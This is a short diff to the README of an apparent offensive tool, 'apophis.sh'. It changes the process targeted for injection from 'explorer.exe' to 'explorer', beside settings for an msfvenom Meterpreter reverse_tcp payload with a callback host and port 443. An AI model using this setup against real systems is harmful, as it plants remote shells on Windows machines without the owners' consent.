@@ -96,7 +96,7 @@ Open with a text editor the bash file ```apophis.sh``` and edit the variables ac
 ```
 #!/bin/bash
 ...
-PROCESS_TO_INJECT="explorer.exe"
+PROCESS_TO_INJECT="explorer"
 MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
 LHOST="192.168.100.128"
 LPORT=443
